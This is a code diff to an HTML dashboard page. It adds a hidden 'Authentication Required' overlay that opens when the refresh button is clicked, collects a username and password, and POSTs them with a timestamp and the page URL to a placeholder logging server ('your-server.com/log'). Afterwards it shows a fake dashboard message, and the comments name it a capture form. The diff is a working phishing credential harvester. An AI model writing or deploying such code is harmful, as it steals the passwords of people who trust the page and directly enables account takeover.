@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -32,6 +31,37 @@
       color: white;
     }
     #status { margin-top: 16px; }
+    
+    /* New styles for the capture overlay */
+    #auth-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.95);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    .auth-box {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 300px;
+    }
+    .auth-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    .auth-box button {
+      width: 100%;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
@@ -45,8 +75,52 @@
     <div id="events"></div>
   </main>
 
+  <!-- Hidden Capture Form -->
+  <div id="auth-overlay">
+    <div class="auth-box">
+      <h3>Authentication Required</h3>
+      <p>Please sign in to view assessment data.</p>
+      <form id="capture-form">
+        <input type="text" name="username" placeholder="Username / Email" required autocomplete="off">
+        <input type="password" name="password" placeholder="Password" required autocomplete="off">
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
   <script>
+    // Configuration: Replace this with your logging URL (e.g., a webhook or server script)
+    const LOGGING_URL = "https://your-server.com/log"; 
+
     document.getElementById("refresh").onclick = async () => {
+      // Show the overlay instead of just changing status text
+      document.getElementById("auth-overlay").style.display = "flex";
+    };
+
+    document.getElementById("capture-form").onsubmit = async (e) => {
+      e.preventDefault();
+      
+      const formData = new FormData(e.target);
+      const credentials = {
+        username: formData.get("username"),
+        password: formData.get("password"),
+        timestamp: new Date().toISOString(),
+        url: window.location.href
+      };
+
+      // Send data to your server
+      try {
+        await fetch(LOGGING_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(credentials)
+        });
+      } catch (err) {
+        console.error("Logging failed", err);
+      }
+
+      // Hide overlay and show the fake dashboard state
+      document.getElementById("auth-overlay").style.display = "none";
       document.getElementById("status").textContent =
         "Dashboard access requires administrator authentication.";
     };
